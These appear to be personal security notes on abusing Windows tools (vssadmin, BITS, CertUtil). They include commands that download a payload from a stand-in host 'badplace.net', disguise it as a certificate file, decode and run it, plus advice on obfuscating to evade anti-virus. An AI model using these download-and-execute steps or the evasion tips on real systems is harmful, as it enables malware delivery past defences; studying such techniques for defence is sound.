# Windows Handy Hints and Tips

## Volume Shadow Copy Service (VSS) ##

- This service allows you to backup whole volumes (i.e. lettered drives)
- It can be interacted with via an admin command `vssadmin`
- `vssadmin list volumes` shows you the applicable volumes
- By viewing information about a volume, you can see where it is stored (somewhere like `\\GLOBALROOT\...`)
- From there, you can start listing files stored in the shadow volume, and can view the contents of anything you find interesting

## Background Intelligent Transfer Service (BITS) ##

- Generally used for Windows updates
- But if we can co-opt it, that sounds like a great attack vector, doesn't it?
- You'd need some degree of access to the client machine to start with (or some way of spoofing it so that you appear to be the windows update server...)
- From that start point, you can run PowerShell commands to download/upload items:
  - `Start-BitsTransfer -Source hxxp://badplace.net/malware.exe -Destination C:\Users\Administrator\Run.exe`
- This has been used in attacks to allow malware to re-infect a machine after it has been removed by the blue team/anti-virus tools. It can also be used to download post-exploitation/second-stage malware.

## CertUtil ##

- Intended for downloading CA info
- Can be used for encoding/decoding Base64 data
- A usage pattern might be:
  - Encode payload with base64
  - Name the payload something unassuming, such as ComodoRootCA.p12
  - Invoke CertUtil, similarly to `certutil.exe -urlcache -split -f hxxp://badplace.net/certs/ComodoRootCA.p12 ComodoRootCA.p12`
  - Use CertUtil to decode the payload: `certutil.exe -decode ComodoRootCA.p12 payload.exe`
  - Run the payload
- Note that anti-virus tools are mostly wise to this, so you will need to obfuscate it carefully if this is the method you want to use
  - Example: my anti-virus decided that this file was infected, due to the command line examples above!